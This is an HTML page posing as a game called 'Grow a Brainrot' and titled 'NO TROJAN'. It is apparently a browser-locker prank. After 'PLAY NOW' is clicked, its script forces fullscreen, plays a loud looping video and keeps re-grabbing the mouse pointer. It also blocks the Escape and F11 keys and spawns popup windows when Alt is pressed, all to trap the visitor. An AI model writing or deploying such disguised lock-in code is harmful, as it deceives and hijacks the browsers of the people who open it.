<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GROW A BRAINROT(NO TROJAN)</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; cursor: none !important; }
        body {
            background: #000;
            height: 100vh;
            display: flex; justify-content: center; align-items: center;
            overflow: hidden; color: white;
        }
        #videoOverlay {
            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            background: #000; z-index: 99999;
        }
        video { width: 100%; height: 100%; object-fit: fill; }
        
        /* Pre-click UI */
        .game-card {
            background: rgba(0,0,0,0.9); border: 8px ridge #0f0; border-radius: 20px;
            padding: 2rem; text-align: center; box-shadow: 0 0 50px #f0f;
            max-width: 450px; width: 90%;
        }
        .play-button {
            background: #f00; color: #fff; padding: 20px 50px; font-size: 2rem;
            font-weight: 900; border: 4px solid #fff; border-radius: 10px; cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="game-card" id="mainCard">
        <h1 style="margin-bottom:20px;">GROW A BRAINROT</h1>
        <img src="https://i.imgur.com/Ohxn6Lc.jpeg" style="width:100%; border-radius:10px; margin-bottom:20px;">
        <button onclick="lockJail()" class="play-button">PLAY NOW</button>
    </div>

    <div id="videoOverlay">
        <video id="v" loop playsinline>
            <source src="video.mp4" type="video/mp4">
        </video>
    </div>

    <script>
        const overlay = document.getElementById('videoOverlay');
        const video = document.getElementById('v');
        const card = document.getElementById('mainCard');

        function lockJail() {
            // 1. Show Video
            card.style.display = 'none';
            overlay.style.display = 'block';
            video.muted = false;
            video.play();

            // 2. Force Fullscreen
            if (overlay.requestFullscreen) {
                overlay.requestFullscreen();
            } else if (overlay.webkitRequestFullscreen) {
                overlay.webkitRequestFullscreen();
            }

            // 3. THE ACTUAL LOCK: Pointer Lock API
            requestLock();
        }

        function requestLock() {
            overlay.requestPointerLock = overlay.requestPointerLock || overlay.webkitRequestPointerLock;
            overlay.requestPointerLock();
        }

        // IF THEY TRY TO UNLOCK (Escape mouse), FORCE IT BACK INSTANTLY
        document.addEventListener('pointerlockchange', lockChangeAlert, false);
        document.addEventListener('webkitpointerlockchange', lockChangeAlert, false);

        function lockChangeAlert() {
            if (document.pointerLockElement !== overlay && document.webkitPointerLockElement !== overlay) {
                // User escaped! Force them back after 50ms
                setTimeout(() => {
                    requestLock();
                }, 50);
            }
        }

        // BLOCK EXIT KEYS
        window.addEventListener("keydown", (e) => {
            if (e.key === "Escape" || e.key === "F11") {
                e.preventDefault();
                requestLock(); // Re-lock on key press
            }
            if (e.altKey) {
                window.open(window.location.href, '_blank', 'width=500,height=500');
            }
        });

        // Re-lock if they click anywhere
        document.addEventListener('mousedown', requestLock);
        
        // Final fallback: If they move the mouse at all, try to grab it
        overlay.addEventListener('mousemove', () => {
            if (!document.pointerLockElement) {
                requestLock();
            }
        });
    </script>
</body>
</html>
